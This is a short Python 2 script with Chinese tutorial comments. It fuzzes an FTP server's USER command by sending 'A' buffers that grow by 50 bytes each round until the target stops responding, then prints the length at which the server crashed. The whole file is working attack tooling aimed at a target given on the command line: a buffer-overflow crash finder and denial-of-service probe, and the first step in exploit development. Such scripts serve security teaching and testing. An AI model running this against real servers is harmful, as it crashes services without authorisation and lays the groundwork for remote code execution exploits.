# -*- coding:utf-8 -*-
# -*- by shackle -*-
#导入你将要使用的模块，这样你就不用去自己实现那些功能函数了
import sys, socket
from time import sleep

#声明第一个变量target用来接收从命令端输入的第一个值
target = sys.argv[1]
#创建50个A的字符串 '\x41'
buff = '\x41'*50

# 使用循环来递增至声明buff变量的长度50
while True:
  #使用"try - except"处理错误与动作
  try:
    # 连接这目标主机的ftp端口 21
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((target,21))
    s.recv(1024)

    print "Sending buffer with length: "+str(len(buff))
    #发送字符串:USER并且带有测试的用户名
    s.send("USER "+buff+"\r\n")
    s.close()
    sleep(1)
    #使用循环来递增直至长度为50
    buff = buff + '\x41'*50

  except: # 如果连接服务器失败，我们就打印出下面的结果
    print "[+] Crash occured with buffer length: "+str(len(buff)-50)
    sys.exit()  